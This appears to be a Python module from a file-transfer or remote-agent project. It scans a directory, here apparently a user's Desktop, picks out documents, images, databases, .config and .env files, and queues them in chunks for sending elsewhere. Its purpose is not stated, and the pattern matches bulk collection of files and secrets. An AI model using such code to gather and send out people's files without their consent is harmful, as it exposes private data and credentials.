from instructionGenerators.fileTransfer import ChunkifierDirectory, ChunkifierSingle
import os
from utils import general
from pathlib import Path

def getContents(path):
    files = []
    directories = []

    for entry in os.scandir(path):
        if entry.is_file():
            files.append(entry)
        elif entry.is_dir():
            directories.append(entry)

    return files, directories

IMPORTANT_EXTENSIONS = {".py", ".json", ".txt", ".db", ".pdf", ".md", ".ppt", ".config",  ".env", ".c", ".cpp", ".java", ".csv", ".ico", ".png", ".jpeg", ".jpg"}
excludedFolders = {".venv", "__pycache__"}
chunkSize = 64 * 1024

def transferDir(uploadingPath):
    fileList, dirList = getContents(uploadingPath)

    for filePath in fileList:
        if Path(filePath.path).suffix not in IMPORTANT_EXTENSIONS:
            continue
        ChunkifierSingle(filePath.path, chunkSize, "", filePath.name, 1, general.pathInfo("db")+"jobQueue.db").sendPackets()

    for dirPath in dirList:
        obj = ChunkifierDirectory(dirPath.path, excludedFolders, chunkSize)
        obj.startTransfer()

# transferDir(r"C:\Users\meerc\Desktop")